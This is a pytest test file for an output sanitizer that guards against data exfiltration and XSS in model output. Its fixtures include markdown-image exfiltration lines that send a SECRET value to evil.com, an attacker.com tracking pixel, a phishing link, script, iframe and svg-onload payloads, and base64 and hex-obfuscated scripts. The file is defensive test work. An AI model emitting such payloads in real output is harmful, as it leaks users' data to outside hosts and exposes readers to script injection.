"""
Tests for Output Sanitizer (Data Exfiltration Defense — Attack Vector #04)
"""

import pytest  # type: ignore

from src.guardrails.output_sanitizer import OutputSanitizer


@pytest.fixture
def sanitizer():
    return OutputSanitizer()


class TestMarkdownImageStripping:
    """Chống Data Exfil via Markdown Image rendering."""

    def test_strips_markdown_image(self, sanitizer):
        text = "Analysis: ![exfil](https://evil.com/steal?data=SECRET)"
        result = sanitizer.sanitize(text)
        assert "https://evil.com" not in result
        assert "[IMG_STRIPPED]" in result

    def test_strips_markdown_image_with_alt(self, sanitizer):
        text = "Found: ![tracking pixel](http://attacker.com/pixel.png)"
        result = sanitizer.sanitize(text)
        assert "attacker.com" not in result

    def test_preserves_normal_text(self, sanitizer):
        text = "This IP 192.168.1.100 is suspicious. MITRE T1110."
        result = sanitizer.sanitize(text)
        assert result == text


class TestMarkdownLinkStripping:
    """Chống clickjacking qua Markdown links."""

    def test_strips_external_link(self, sanitizer):
        text = "See [details](https://phishing.com/login)"
        result = sanitizer.sanitize(text)
        assert "phishing.com" not in result
        assert "[LINK_STRIPPED]" in result


class TestHTMLTagStripping:
    """Chống XSS và HTML-based exfil."""

    def test_strips_img_tag(self, sanitizer):
        text = 'Check <img src="https://evil.com/track"> this'
        result = sanitizer.sanitize(text)
        assert "<img" not in result
        assert "[IMG_STRIPPED]" in result

    def test_strips_script_tag(self, sanitizer):
        text = "Normal <script>alert('xss')</script> text"
        result = sanitizer.sanitize(text)
        assert "<script>" not in result
        assert "[SCRIPT_STRIPPED]" in result

    def test_strips_iframe(self, sanitizer):
        text = 'Embedded <iframe src="https://evil.com"></iframe> content'
        result = sanitizer.sanitize(text)
        assert "<iframe" not in result

    def test_strips_svg_with_js(self, sanitizer):
        text = '<svg onload="alert(1)">attack</svg>'
        result = sanitizer.sanitize(text)
        assert "<svg" not in result


class TestDataURIStripping:
    """Chống Data URI exfil."""

    def test_strips_data_uri(self, sanitizer):
        text = "Found: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
        result = sanitizer.sanitize(text)
        assert "data:text/html" not in result
        assert "[DATA_URI_STRIPPED]" in result


class TestSanitizeForDB:
    """Test DB-safe sanitization (using parameterized queries, no manual escaping)."""

    def test_retains_single_quotes(self, sanitizer):
        text = "O'Malley's attack"
        result = sanitizer.sanitize_for_db(text)
        assert "O'Malley's attack" in result

    def test_strips_but_keeps_quotes(self, sanitizer):
        text = "![x](http://evil.com) and O'Brien"
        result = sanitizer.sanitize_for_db(text)
        assert "evil.com" not in result
        assert "O'Brien" in result


class TestStripCounter:
    """Verify strip counting."""

    def test_counts_stripped_patterns(self, sanitizer):
        text = "![a](http://evil.com) and <script>x</script>"
        sanitizer.sanitize(text)
        assert sanitizer.last_strip_count >= 2

    def test_zero_strips_for_clean_text(self, sanitizer):
        sanitizer.sanitize("Normal security log analysis.")
        assert sanitizer.last_strip_count == 0


class TestEdgeCases:
    """Edge cases."""

    def test_empty_string(self, sanitizer):
        assert sanitizer.sanitize("") == ""

    def test_none_input(self, sanitizer):
        assert sanitizer.sanitize(None) is None

    def test_multiple_patterns(self, sanitizer):
        text = '![img](http://evil.com/a) <script>alert(1)</script> <img src="http://evil.com/b">'
        result = sanitizer.sanitize(text)
        assert "evil.com" not in result
        assert sanitizer.last_strip_count >= 3

    def test_whitespace_bypass_markdown_image(self, sanitizer):
        text = "Analysis: ![exfil] \t (https://evil.com/steal?data=SECRET)"
        result = sanitizer.sanitize(text)
        assert "evil.com" not in result
        assert "[IMG_STRIPPED]" in result

    def test_whitespace_bypass_markdown_link(self, sanitizer):
        text = "See [details]  (https://phishing.com/login)"
        result = sanitizer.sanitize(text)
        assert "phishing.com" not in result
        assert "[LINK_STRIPPED]" in result

    def test_strips_zero_width_chars(self, sanitizer):
        text = "Hello\u200bWorld\u200c!\u200d"
        result = sanitizer.sanitize(text)
        assert result == "HelloWorld!"

    def test_strips_ansi_escapes(self, sanitizer):
        text = "\x1b[31mRed Alert\x1b[0m"
        result = sanitizer.sanitize(text)
        assert result == "Red Alert"

    def test_base64_obfuscation(self, sanitizer):
        # PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== is Base64 for <script>alert(1)</script>
        text = "Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
        result = sanitizer.sanitize(text)
        assert "[BASE64_OBFUSCATED_STRIPPED]" in result
        assert "PHNjcmlwd" not in result

    def test_hex_obfuscation(self, sanitizer):
        # 3c7363726970743e is hex representation of <script>
        text = "Hex: 3c7363726970743e"
        result = sanitizer.sanitize(text)
        assert "[HEX_OBFUSCATED_STRIPPED]" in result
        assert "3c736372" not in result
